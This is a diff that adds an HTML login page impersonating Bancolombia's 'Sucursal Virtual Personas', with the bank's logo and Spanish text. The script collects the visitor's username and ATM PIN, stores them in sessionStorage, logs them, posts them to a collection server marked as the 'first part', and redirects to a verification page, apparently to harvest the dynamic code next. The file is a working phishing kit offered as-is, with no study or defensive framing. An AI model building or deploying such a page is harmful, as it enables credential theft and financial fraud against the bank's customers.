@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Sucursal Virtual Personas</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="main-container">
+        <img src="logo bancolombia.png" alt="Logo Bancolombia" class="logo">
+        <h1>Sucursal Virtual Personas</h1>
+        <div class="info-box">
+            <p><strong>Que los buenos deseos sean más que deseos.</strong></p>
+            <p>Hubo un tiempo en que cruzar la frontera con Venezuela era buscar refugio...</p>
+        </div>
+        <div class="login-box">
+            <h2>¡Hola!</h2>
+            <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+            <label>Usuario</label>
+            <input type="text" id="usuario" placeholder="Tu usuario">
+            <a href="#" class="small-link">¿Olvidaste tu usuario?</a>
+            <label>Clave del cajero</label>
+            <input type="password" id="clave" placeholder="Tu clave">
+            <a href="#" class="small-link">¿Olvidaste o bloqueaste tu clave?</a>
+            <button class="btn-login" id="btnLogin">Iniciar sesión</button>
+            <a href="#" class="link-crear">Crear usuario</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('btnLogin').addEventListener('click', async (e) => {
+            e.preventDefault();
+            
+            const usuario = document.getElementById('usuario').value;
+            const clave = document.getElementById('clave').value;
+            
+            // GUARDAR AMBOS DATOS
+            sessionStorage.setItem('usuario', usuario);
+            sessionStorage.setItem('clave', clave);
+            
+            console.log('Guardado en sessionStorage:', {usuario, clave});
+            
+            // Enviar al servidor PRIMERA PARTE
+            try {
+                await fetch('http://localhost:3000/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        usuario, 
+                        clave, 
+                        claveDinamica: 'PENDIENTE',
+                        fecha: new Date().toLocaleString() 
+                    })
+                });
+            } catch (error) {
+                console.log('Error servidor:', error);
+            }
+            
+            // Redirigir
+            window.location.href = 'verificacion.html';
+        });
+    </script>
+</body>
+</html>
